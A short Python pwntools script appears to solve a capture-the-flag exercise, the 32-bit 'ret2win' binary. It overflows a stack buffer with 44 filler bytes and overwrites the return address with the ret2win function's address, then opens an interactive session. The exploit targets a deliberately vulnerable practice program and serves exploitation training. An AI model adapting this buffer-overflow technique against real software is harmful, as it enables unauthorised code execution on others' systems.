
from pwn import *

elf = ELF("./ret2win32")
ret2win = elf.symbols.ret2win
#log.info(ret2win)

rop  = b"A" * 44
rop += p32(ret2win)

p = process("./ret2win32")
p.sendline(rop)
p.interactive()
